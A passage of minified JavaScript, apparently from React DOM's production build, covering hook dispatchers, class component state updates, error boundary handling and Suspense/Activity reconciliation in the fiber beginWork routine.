0||(ma&1073741824)!==0&&(me&261930)===0?e.memoizedState=t:(e.memoizedState=a,e=Qd(),le.lanes|=e,Ua|=e,a)}function Qr(e,t,a,l){return Et(a,t)?a:Xl.current!==null?(e=Bc(e,a,l),Et(e,t)||($e=!0),e):(ma&42)===0||(ma&1073741824)!==0&&(me&261930)===0?($e=!0,e.memoizedState=a):(e=Qd(),le.lanes|=e,Ua|=e,t)}function Kr(e,t,a,l,n){var i=k.p;k.p=i!==0&&8>i?i:8;var c=b.T,u={};b.T=u,Gc(e,!1,t,a);try{var r=n(),y=b.S;if(y!==null&&y(u,r),r!==null&&typeof r=="object"&&typeof r.then=="function"){var x=Tm(r,l);_n(e,t,x,Dt(e))}else _n(e,t,l,Dt(e))}catch(A){_n(e,t,{then:function(){},status:"rejected",reason:A},Dt())}finally{k.p=i,c!==null&&u.types!==null&&(c.types=u.types),b.T=c}}function wm(){}function Yc(e,t,a,l){if(e.tag!==5)throw Error(m(476));var n=Zr(e).queue;Kr(e,n,t,Z,a===null?wm:function(){return Wr(e),a(l)})}function Zr(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:Z,baseState:Z,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:pa,lastRenderedState:Z},next:null};var a={};return t.next={memoizedState:a,baseState:a,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:pa,lastRenderedState:a},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Wr(e){var t=Zr(e);t.next===null&&(t=e.alternate.memoizedState),_n(e,t.next.queue,{},Dt())}function qc(){return ut($n)}function Jr(){return Ke().memoizedState}function Fr(){return Ke().memoizedState}function Om(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var a=Dt();e=Ma(a);var l=Da(t,e,a);l!==null&&(Ct(l,t,a),On(l,t,a)),t={cache:yc()},e.payload=t;return}t=t.return}}function zm(e,t,a){var l=Dt();a={lane:l,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},Zi(e)?Ir(t,a):(a=ic(e,t,a,l),a!==null&&(Ct(a,e,l),Pr(a,t,l)))}function $r(e,t,a){var l=Dt();_n(e,t,a,l)}function _n(e,t,a,l){var n={lane:l,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null};if(Zi(e))Ir(t,n);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=t.lastRenderedReducer,i!==null))try{var c=t.lastRenderedState,u=i(c,a);if(n.hasEagerState=!0,n.eagerState=u,Et(u,c))return Ei(e,t,n,0),ke===null&&Ai(),!1}catch{}if(a=ic(e,t,n,l),a!==null)return Ct(a,e,l),Pr(a,t,l),!0}return!1}function Gc(e,t,a,l){if(l={lane:2,revertLane:bu(),gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null},Zi(e)){if(t)throw Error(m(479))}else t=ic(e,a,l,2),t!==null&&Ct(t,e,2)}function Zi(e){var t=e.alternate;return e===le||t!==null&&t===le}function Ir(e,t){Ql=Yi=!0;var a=e.pending;a===null?t.next=t:(t.next=a.next,a.next=t),e.pending=t}function Pr(e,t,a){if((a&4194048)!==0){var l=t.lanes;l&=e.pendingLanes,a|=l,t.lanes=a,hi(e,a)}}var Hn={readContext:ut,use:Vi,useCallback:Ye,useContext:Ye,useEffect:Ye,useImperativeHandle:Ye,useLayoutEffect:Ye,useInsertionEffect:Ye,useMemo:Ye,useReducer:Ye,useRef:Ye,useState:Ye,useDebugValue:Ye,useDeferredValue:Ye,useTransition:Ye,useSyncExternalStore:Ye,useId:Ye,useHostTransitionStatus:Ye,useFormState:Ye,useActionState:Ye,useOptimistic:Ye,useMemoCache:Ye,useCacheRefresh:Ye};Hn.useEffectEvent=Ye;var ed={readContext:ut,use:Vi,useCallback:function(e,t){return vt().memoizedState=[e,t===void 0?null:t],e},useContext:ut,useEffect:Lr,useImperativeHandle:function(e,t,a){a=a!=null?a.concat([e]):null,Qi(4194308,4,qr.bind(null,t,e),a)},useLayoutEffect:function(e,t){return Qi(4194308,4,e,t)},useInsertionEffect:function(e,t){Qi(4,2,e,t)},useMemo:function(e,t){var a=vt();t=t===void 0?null:t;var l=e();if(hl){Ft(!0);try{e()}finally{Ft(!1)}}return a.memoizedState=[l,t],l},useReducer:function(e,t,a){var l=vt();if(a!==void 0){var n=a(t);if(hl){Ft(!0);try{a(t)}finally{Ft(!1)}}}else n=t;return l.memoizedState=l.baseState=n,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},l.queue=e,e=e.dispatch=zm.bind(null,le,e),[l.memoizedState,e]},useRef:function(e){var t=vt();return e={current:e},t.memoizedState=e},useState:function(e){e=Hc(e);var t=e.queue,a=$r.bind(null,le,t);return t.dispatch=a,[e.memoizedState,a]},useDebugValue:Uc,useDeferredValue:function(e,t){var a=vt();return Bc(a,e,t)},useTransition:function(){var e=Hc(!1);return e=Kr.bind(null,le,e.queue,!0,!1),vt().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,a){var l=le,n=vt();if(ge){if(a===void 0)throw Error(m(407));a=a()}else{if(a=t(),ke===null)throw Error(m(349));(me&127)!==0||xr(l,t,a)}n.memoizedState=a;var i={value:a,getSnapshot:t};return n.queue=i,Lr(Nr.bind(null,l,i,e),[e]),l.flags|=2048,Zl(9,{destroy:void 0},Tr.bind(null,l,i,a,t),null),a},useId:function(){var e=vt(),t=ke.identifierPrefix;if(ge){var a=It,l=$t;a=(l&~(1<<32-gt(l)-1)).toString(32)+a,t="_"+t+"R_"+a,a=qi++,0<a&&(t+="H"+a.toString(32)),t+="_"}else a=Nm++,t="_"+t+"r_"+a.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:qc,useFormState:Mr,useActionState:Mr,useOptimistic:function(e){var t=vt();t.memoizedState=t.baseState=e;var a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=a,t=Gc.bind(null,le,!0,a),a.dispatch=t,[e,t]},useMemoCache:Mc,useCacheRefresh:function(){return vt().memoizedState=Om.bind(null,le)},useEffectEvent:function(e){var t=vt(),a={impl:e};return t.memoizedState=a,function(){if((Te&2)!==0)throw Error(m(440));return a.impl.apply(void 0,arguments)}}},Vc={readContext:ut,use:Vi,useCallback:Vr,useContext:ut,useEffect:Lc,useImperativeHandle:Gr,useInsertionEffect:Br,useLayoutEffect:Yr,useMemo:Xr,useReducer:Xi,useRef:Rr,useState:function(){return Xi(pa)},useDebugValue:Uc,useDeferredValue:function(e,t){var a=Ke();return Qr(a,we.memoizedState,e,t)},useTransition:function(){var e=Xi(pa)[0],t=Ke().memoizedState;return[typeof e=="boolean"?e:Dn(e),t]},useSyncExternalStore:br,useId:Jr,useHostTransitionStatus:qc,useFormState:Dr,useActionState:Dr,useOptimistic:function(e,t){var a=Ke();return Ar(a,we,e,t)},useMemoCache:Mc,useCacheRefresh:Fr};Vc.useEffectEvent=Ur;var td={readContext:ut,use:Vi,useCallback:Vr,useContext:ut,useEffect:Lc,useImperativeHandle:Gr,useInsertionEffect:Br,useLayoutEffect:Yr,useMemo:Xr,useReducer:_c,useRef:Rr,useState:function(){return _c(pa)},useDebugValue:Uc,useDeferredValue:function(e,t){var a=Ke();return we===null?Bc(a,e,t):Qr(a,we.memoizedState,e,t)},useTransition:function(){var e=_c(pa)[0],t=Ke().memoizedState;return[typeof e=="boolean"?e:Dn(e),t]},useSyncExternalStore:br,useId:Jr,useHostTransitionStatus:qc,useFormState:Hr,useActionState:Hr,useOptimistic:function(e,t){var a=Ke();return we!==null?Ar(a,we,e,t):(a.baseState=e,[e,a.queue.dispatch])},useMemoCache:Mc,useCacheRefresh:Fr};td.useEffectEvent=Ur;function Xc(e,t,a,l){t=e.memoizedState,a=a(l,t),a=a==null?t:Q({},t,a),e.memoizedState=a,e.lanes===0&&(e.updateQueue.baseState=a)}var Qc={enqueueSetState:function(e,t,a){e=e._reactInternals;var l=Dt(),n=Ma(l);n.payload=t,a!=null&&(n.callback=a),t=Da(e,n,l),t!==null&&(Ct(t,e,l),On(t,e,l))},enqueueReplaceState:function(e,t,a){e=e._reactInternals;var l=Dt(),n=Ma(l);n.tag=1,n.payload=t,a!=null&&(n.callback=a),t=Da(e,n,l),t!==null&&(Ct(t,e,l),On(t,e,l))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var a=Dt(),l=Ma(a);l.tag=2,t!=null&&(l.callback=t),t=Da(e,l,a),t!==null&&(Ct(t,e,a),On(t,e,a))}};function ad(e,t,a,l,n,i,c){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(l,i,c):t.prototype&&t.prototype.isPureReactComponent?!xn(a,l)||!xn(n,i):!0}function ld(e,t,a,l){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(a,l),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(a,l),t.state!==e&&Qc.enqueueReplaceState(t,t.state,null)}function ml(e,t){var a=t;if("ref"in t){a={};for(var l in t)l!=="ref"&&(a[l]=t[l])}if(e=e.defaultProps){a===t&&(a=Q({},a));for(var n in e)a[n]===void 0&&(a[n]=e[n])}return a}function nd(e){ji(e)}function id(e){console.error(e)}function sd(e){ji(e)}function Wi(e,t){try{var a=e.onUncaughtError;a(t.value,{componentStack:t.stack})}catch(l){setTimeout(function(){throw l})}}function cd(e,t,a){try{var l=e.onCaughtError;l(a.value,{componentStack:a.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(n){setTimeout(function(){throw n})}}function Kc(e,t,a){return a=Ma(a),a.tag=3,a.payload={element:null},a.callback=function(){Wi(e,t)},a}function ud(e){return e=Ma(e),e.tag=3,e}function od(e,t,a,l){var n=a.type.getDerivedStateFromError;if(typeof n=="function"){var i=l.value;e.payload=function(){return n(i)},e.callback=function(){cd(t,a,l)}}var c=a.stateNode;c!==null&&typeof c.componentDidCatch=="function"&&(e.callback=function(){cd(t,a,l),typeof n!="function"&&(Ba===null?Ba=new Set([this]):Ba.add(this));var u=l.stack;this.componentDidCatch(l.value,{componentStack:u!==null?u:""})})}function km(e,t,a,l,n){if(a.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){if(t=a.alternate,t!==null&&Bl(t,a,n,!0),a=Ot.current,a!==null){switch(a.tag){case 31:case 13:return Gt===null?ss():a.alternate===null&&qe===0&&(qe=3),a.flags&=-257,a.flags|=65536,a.lanes=n,l===Hi?a.flags|=16384:(t=a.updateQueue,t===null?a.updateQueue=new Set([l]):t.add(l),gu(e,l,n)),!1;case 22:return a.flags|=65536,l===Hi?a.flags|=16384:(t=a.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([l])},a.updateQueue=t):(a=t.retryQueue,a===null?t.retryQueue=new Set([l]):a.add(l)),gu(e,l,n)),!1}throw Error(m(435,a.tag))}return gu(e,l,n),ss(),!1}if(ge)return t=Ot.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=n,l!==dc&&(e=Error(m(422),{cause:l}),Cn(Ut(e,a)))):(l!==dc&&(t=Error(m(423),{cause:l}),Cn(Ut(t,a))),e=e.current.alternate,e.flags|=65536,n&=-n,e.lanes|=n,l=Ut(l,a),n=Kc(e.stateNode,l,n),Tc(e,n),qe!==4&&(qe=2)),!1;var i=Error(m(520),{cause:l});if(i=Ut(i,a),Vn===null?Vn=[i]:Vn.push(i),qe!==4&&(qe=2),t===null)return!0;l=Ut(l,a),a=t;do{switch(a.tag){case 3:return a.flags|=65536,e=n&-n,a.lanes|=e,e=Kc(a.stateNode,l,e),Tc(a,e),!1;case 1:if(t=a.type,i=a.stateNode,(a.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||i!==null&&typeof i.componentDidCatch=="function"&&(Ba===null||!Ba.has(i))))return a.flags|=65536,n&=-n,a.lanes|=n,n=ud(n),od(n,e,a,l),Tc(a,n),!1}a=a.return}while(a!==null);return!1}var Zc=Error(m(461)),$e=!1;function ot(e,t,a,l){t.child=e===null?hr(t,null,a,l):fl(t,e.child,a,l)}function rd(e,t,a,l,n){a=a.render;var i=t.ref;if("ref"in l){var c={};for(var u in l)u!=="ref"&&(c[u]=l[u])}else c=l;return ul(t),l=wc(e,t,a,c,i,n),u=Oc(),e!==null&&!$e?(zc(e,t,n),ya(e,t,n)):(ge&&u&&oc(t),t.flags|=1,ot(e,t,l,n),t.child)}function dd(e,t,a,l,n){if(e===null){var i=a.type;return typeof i=="function"&&!sc(i)&&i.defaultProps===void 0&&a.compare===null?(t.tag=15,t.type=i,fd(e,t,i,l,n)):(e=Oi(a.type,null,l,t,t.mode,n),e.ref=t.ref,e.return=t,t.child=e)}if(i=e.child,!tu(e,n)){var c=i.memoizedProps;if(a=a.compare,a=a!==null?a:xn,a(c,l)&&e.ref===t.ref)return ya(e,t,n)}return t.flags|=1,e=ra(i,l),e.ref=t.ref,e.return=t,t.child=e}function fd(e,t,a,l,n){if(e!==null){var i=e.memoizedProps;if(xn(i,l)&&e.ref===t.ref)if($e=!1,t.pendingProps=l=i,tu(e,n))(e.flags&131072)!==0&&($e=!0);else return t.lanes=e.lanes,ya(e,t,n)}return Wc(e,t,a,l,n)}function hd(e,t,a,l){var n=l.children,i=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),l.mode==="hidden"){if((t.flags&128)!==0){if(i=i!==null?i.baseLanes|a:a,e!==null){for(l=t.child=e.child,n=0;l!==null;)n=n|l.lanes|l.childLanes,l=l.sibling;l=n&~i}else l=0,t.child=null;return md(e,t,i,a,l)}if((a&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&Di(t,i!==null?i.cachePool:null),i!==null?yr(t,i):Cc(),gr(t);else return l=t.lanes=536870912,md(e,t,i!==null?i.baseLanes|a:a,a,l)}else i!==null?(Di(t,i.cachePool),yr(t,i),Ha(),t.memoizedState=null):(e!==null&&Di(t,null),Cc(),Ha());return ot(e,t,n,a),t.child}function Rn(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function md(e,t,a,l,n){var i=vc();return i=i===null?null:{parent:Je._currentValue,pool:i},t.memoizedState={baseLanes:a,cachePool:i},e!==null&&Di(t,null),Cc(),gr(t),e!==null&&Bl(e,t,l,!0),t.childLanes=n,null}function Ji(e,t){return t=$i({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function pd(e,t,a){return fl(t,e.child,null,a),e=Ji(t,t.pendingProps),e.flags|=2,zt(t),t.memoizedState=null,e}function Mm(e,t,a){var l=t.pendingProps,n=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(ge){if(l.mode==="hidden")return e=Ji(t,l),t.lanes=536870912,Rn(null,e);if(Ac(t),(e=He)?(e=wf(e,qt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:Ea!==null?{id:$t,overflow:It}:null,retryLane:536870912,hydrationErrors:null},a=Io(e),a.return=t,t.child=a,ct=t,He=null)):e=null,e===null)throw Oa(t);return t.lanes=536870912,null}return Ji(t,l)}var i=e.memoizedState;if(i!==null){var c=i.dehydrated;if(Ac(t),n)if(t.flags&256)t.flags&=-257,t=pd(e,t,a);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(m(558));else if($e||Bl(e,t,a,!1),n=(a&e.childLanes)!==0,$e||n){if(l=ke,l!==null&&(c=o(l,a),c!==0&&c!==i.retryLane))throw i.retryLane=c,nl(e,c),Ct(l,e,c),Zc;ss(),t=pd(e,t,a)}else e=i.treeContext,He=Vt(c.nextSibling),ct=t,ge=!0,wa=null,qt=!1,e!==null&&tr(t,e),t=Ji(t,l),t.flags|=4096;return t}return e=ra(e.child,{mode:l.mode,children:l.children}),e.ref=t.ref,t.child=e,e.return=t,e}function Fi(e,t){var a=t.ref;if(a===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof a!="function"&&typeof a!="object")throw Error(m(284));(e===null||e.ref!==a)&&(t.flags|=4194816)}}function Wc(e,t,a,l,n){return ul(t),a=wc(e,t,a,l,void 0,n),l=Oc(),e!==null&&!$e?(zc(e,t,n),ya(e,t,n)):(ge&&l&&oc(t),t.flags|=1,ot(e,t,a,n),t.child)}function yd(e,t,a,l,n,i){return ul(t),t.updateQueue=null,a=Sr(t,l,a,n),vr(e),l=Oc(),e!==null&&!$e?(zc(e,t,i),ya(e,t,i)):(ge&&l&&oc(t),t.flags|=1,ot(e,t,a,i),t.child)}function gd(e,t,a,l,n){if(ul(t),t.stateNode===null){var i=Hl,c=a.contextType;typeof c=="object"&&c!==null&&(i=ut(c)),i=new a(l,i),t.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=Qc,t.stateNode=i,i._reactInternals=t,i=t.stateNode,i.props=l,i.state=t.memoizedState,i.refs={},bc(t),c=a.contextType,i.context=typeof c=="object"&&c!==null?ut(c):Hl,i.state=t.memoizedState,c=a.getDerivedStateFromProps,typeof c=="function"&&(Xc(t,a,c,l),i.state=t.memoizedState),typeof a.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(c=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),c!==i.state&&Qc.enqueueReplaceState(i,i.state,null),kn(t,l,i,n),zn(),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308),l=!0}else if(e===null){i=t.stateNode;var u=t.memoizedProps,r=ml(a,u);i.props=r;var y=i.context,x=a.contextType;c=Hl,typeof x=="object"&&x!==null&&(c=ut(x));var A=a.getDerivedStateFromProps;x=typeof A=="function"||typeof i.getSnapshotBeforeUpdate=="function",u=t.pendingProps!==u,x||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(u||y!==c)&&ld(t,i,l,c),ka=!1;var g=t.memoizedState;i.state=g,kn(t,l,i,n),zn(),y=t.memoizedState,u||g!==y||ka?(typeof A=="function"&&(Xc(t,a,A,l),y=t.memoizedState),(r=ka||ad(t,a,r,l,g,y,c))?(x||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(t.flags|=4194308)):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=l,t.memoizedState=y),i.props=l,i.state=y,i.context=c,l=r):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),l=!1)}else{i=t.stateNode,xc(e,t),c=t.memoizedProps,x=ml(a,c),i.props=x,A=t.pendingProps,g=i.context,y=a.contextType,r=Hl,typeof y=="object"&&y!==null&&(r=ut(y)),u=a.getDerivedStateFromProps,(y=typeof u=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(c!==A||g!==r)&&ld(t,i,l,r),ka=!1,g=t.memoizedState,i.state=g,kn(t,l,i,n),zn();var v=t.memoizedState;c!==A||g!==v||ka||e!==null&&e.dependencies!==null&&ki(e.dependencies)?(typeof u=="function"&&(Xc(t,a,u,l),v=t.memoizedState),(x=ka||ad(t,a,x,l,g,v,r)||e!==null&&e.dependencies!==null&&ki(e.dependencies))?(y||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(l,v,r),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(l,v,r)),typeof i.componentDidUpdate=="function"&&(t.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof i.componentDidUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=1024),t.memoizedProps=l,t.memoizedState=v),i.props=l,i.state=v,i.context=r,l=x):(typeof i.componentDidUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=1024),l=!1)}return i=l,Fi(e,t),l=(t.flags&128)!==0,i||l?(i=t.stateNode,a=l&&typeof a.getDerivedStateFromError!="function"?null:i.render(),t.flags|=1,e!==null&&l?(t.child=fl(t,e.child,null,n),t.child=fl(t,null,a,n)):ot(e,t,a,n),t.memoizedState=i.state,e=t.child):e=ya(e,t,n),e}function vd(e,t,a,l){return sl(),t.flags|=256,ot(e,t,a,l),t.child}var Jc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Fc(e){return{baseLanes:e,cachePool:cr()}}function $c(e,t,a){return e=e!==null?e.childLanes&~a:0,t&&(e|=Mt),e}function Sd(e,t,a){var l=t.pendingProps,n=!1,i=(t.flags&128)!==0,c;if((c=i)||(c=e!==null&&e.memoizedState===null?!1:(Qe.current&2)!==0),c&&(n=!0,t.flags&=-129),c=(t.flags&32)!==0,t.flags&=-33,e===null){if(ge){if(n?_a(t):Ha(),(e=He)?(e=wf(e,qt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:Ea!==null?{id:$t,overflow:It}:null,retryLane:536870912,hydrationErrors:null},a=Io(e),a.return=t,t.child=a,ct=t,He=null)):e=null,e===null)throw Oa(t);return Du(e)?t.lanes=32:t.lanes=536870912,null}var u=l.children;return l=l.fallback,n?(Ha(),n=t.mode,u=$i({mode:"hidden",children:u},n),l=il(l,n,a,null),u.return=t,l.return=t,u.sibling=l,t.child=u,l=t.child,l.memoizedState=Fc(a),l.childLanes=$c(e,c,a),t.memoizedState=Jc,Rn(null,l)):(_a(t),Ic(t,u))}var r=e.memoizedState;if(r!==null&&(u=r.dehydrated,u!==null)){if(i)t.flags&256?(_a(t),t.flags&=-257,t=Pc(e,t,a)):t.memoizedState!==null?(Ha(),t.child=e.child,t.flags|=128,t=null):(Ha(),u=l.fallback,n=t.mode,l=$i({mode:"visible",children:l.children},n),u=il(u,n,a,null),u.flags|=2,l.return=t,u.return=t,l.sibling=u,t.child=l,fl(t,e.child,null,a),l=t.child,l.memoizedState=Fc(a),l.childLanes=$c(e,c,a),t.memoizedState=Jc,t=Rn(null,l));else if(_a(t),Du(u)){if(c=u.nextSibling&&u.nextSibling.dataset,c)var y=c.dgst;c=y,l=Error(m(419)),l.stack="",l.digest=c,Cn({value:l,source:null,stack:null}),t=Pc(e,t,a)}else if($e||Bl(e,t,a,!1),c=(a&e.childLanes)!==0,$e||c){if(c=ke,c!==null&&(l=o(c,a),l!==0&&l!==r.retryLane))throw r.retryLane=l,nl(e,l),Ct(c,e,l),Zc;Mu(u)||ss(),t=Pc(e,t,a)}else Mu(u)?(t.flags|=192,t.child=e.child,t=null):(e=r.treeContext,He=Vt(u.nextSibling),ct=t,ge=!0,wa=null,qt=!1,e!==null&&tr(t,e),t=Ic(t,l.children),t.flags|=4096);return t}return n?(Ha(),u=l.fallback,n=t.mode,r=e.child,y=r.sibling,l=ra(r,{mode:"hidden",children:l.children}),l.subtreeFlags=r.subtreeFlags&65011712,y!==null?u=ra(y,u):(u=il(u,n,a,null),u.flags|=2),u.return=t,l.return=t,l.sibling=u,t.child=l,Rn(null,l),l=t.child,u=e.child.memoizedState,u===null?u=Fc(a):(n=u.cachePool,n!==null?(r=Je._currentValue,n=n.parent!==r?{parent:r,pool:r}:n):n=cr(),u={baseLanes:u.baseLanes|a,cachePool:n}),l.memoizedState=u,l.childLanes=$c(e,c,a),t.memoizedState=Jc,Rn(e.child,l)):(_a(t),a=e.child,e=a.sibling,a=ra(a,{mode:"visible",children:l.children}),a.return=t,a.sibling=null,e!==null&&(c=t.deletions,c===null?(t.deletions=[e],t.flags|=16):c.push(e)),t.child=a,t.memoizedState=null,a)}function Ic(e,t){return t=$i({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function $i(e,t){return e=wt(22,e,null,t),e.lanes=0,e}function Pc(e,t,a){return fl(t,e.child,null,a),e=Ic(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function bd(e,t,a){e.lanes|=t;var l=e.alternate;l!==null&&(l.lanes|=t),mc(e.return,t,a)}function eu(e,t,a,l,n,i){var c=e.memoizedState;c===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:l,tail:a,tailMode:n,treeForkCount:i}:(c.isBackwards=t,c.rendering=null,c.renderingStartTime=0,c.last=l,c.tail=a,c.tailMode=n,c.treeForkCount=i)}function xd(e,t,a){var l=t.pendingProps,n=l.revealOrder,i=l.tail;l=l.children;var c=Qe.current,u=(c&2)!==0;if(u?(c=c&1|2,t.flags|=128):c&=1,z(Qe,c),ot(e,t,l,a),l=ge?Nn:0,!u&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&bd(e,a,t);else if(e.tag===19)bd(e,a,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(n){case"forwards":for(a=t.child,n=null;a!==null;)e=a.alternate,e!==null&&Bi(e)===null&&(n=a),a=a.sibling;a=n,a===null?(n=t.child,t.child=null):(n=a.sibling,a.sibling=null),eu(t,!1,n,a,i,l);break;case"backwards":case"unstable_legacy-backwards":for(a=null,n=t.child,t.child=null;n!==null;){if(e=n.alternate,e!==null&&Bi(e)===null){t.child=n;break}e=n.sibling,n.sibling=a,a=n,n=e}eu(t,!0,a,null,i,l);break;case"together":eu(t,!1,null,null,void 0,l);break;default:t.memoizedState=null}return t.child}function ya(e,t,a){if(e!==null&&(t.dependencies=e.dependencies),Ua|=t.lanes,(a&t.childLanes)===0)if(e!==null){if(Bl(e,t,a,!1),(a&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(m(153));if(t.child!==null){for(e=t.child,a=ra(e,e.pendingProps),t.child=a,a.return=t;e.sibling!==null;)e=e.sibling,a=a.sibling=ra(e,e.pendingProps),a.return=t;a.sibling=null}return t.child}function tu(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&ki(e)))}function Dm(e,t,a){switch(t.tag){case 3:at(t,t.stateNode.containerInfo),za(t,Je,e.memoizedState.cache),sl();break;case 27:case 5:_t(t);break;case 4:at(t,t.stateNode.containerInfo);break;case 10:za(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,Ac(t),null;break;case 13:var l=t.memoizedState;if(l!==null)return l.dehydrated!==null?(_a(t),t.flags|=128,null):(a&t.child.childLanes)!==0?Sd(e,t,a):(_a(t),e=ya(e,t,a),e!==null?e.sibling:null);_a(t);break;case 19:var n=(e.flags&128)!==0;if(l=(a&t.childLanes)!==0,l||(Bl(e,t,a,!1),l=(a&t.childLanes)!==0),n){if(l)return xd(e,t,a);t.flags|=128}if(n=t.memoizedState,n!==null&&(n.rendering=null,n.tail=null,n.lastEffect=null),z(Qe,Qe.current),l)break;return null;case 22:return t.lanes=0,hd(e,t,a,t.pendingProps);case 24:za(t,Je,e.memoizedState.cache)}return ya(e,t,a)}function Td(e,t,a){if(e!==null)if(e.memoizedProps!==t.pendingProps)$e=!0;else{if(!tu(e,a)&&(t.flags&128)===0)return $e=!1,Dm(e,t,a);$e=(e.flags&131072)!==0}else $e=!1,ge&&(t.flags&1048576)!==0&&er(t,Nn,t.index);switch(t.lanes=0,t.tag){case 16:e:{var l=t.pendingProps;if(e=rl(t.elementType),t.type=e,typeof e=="function")sc(e)?(l=ml(e,l),t.tag=1,t=gd(null,t,e,l,a)):(t.tag=0,t=Wc(null,t,e,l,a));else{if(e!=null){var n=e.$$typeof;if(n===tt){t.tag=11,t=rd(null,t,e,l,a);break e}else if(n===D){t.tag=14,t=dd(null,t,e,l,a);break e}}throw t=We(e)||e,Error(m(306,t,""))}}return t;case 0:return Wc(e,t,t.type,t.pendingProps,a);case 1:return l=t.type,n=ml(l,t.pendingProps),gd(e,t,l,n,a);case 3:e:{if(at(t,t.stateNode.containerInfo),e===null)throw Error(m(387));l=t.pendingProps;var i=t.memoizedState;n=i.element,xc(e,t),kn(t,l,null,a);var c=t.memoizedState;if(l=c.cache,za(t,Je,l),l!==i.cache&&pc(t,[Je],a,!0),zn(),l=c.element,i.isDehydrated)if(i={element:l,isDehydrated:!1,cache:c.cache},t.updateQueue.baseState=i,t.memoizedState=i,t.flags&256){t=vd(e,t,l,a);break e}else if(l!==n){n=Ut(Error(m(424)),t),Cn(n),t=vd(e,t,l,a);break e}else for(e=t.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,He=Vt(e.firstChild),ct=t,ge=!0,wa=null,qt=!0,a=hr(t,null,l,a),t.child=a;a;)a.flags=a.flags&-3|4096,a=a.sibling;else{if(sl(),l===n){t=ya(e,t,a);break e}ot(e,t,l,a)}t=t.child}return t;case 26:return 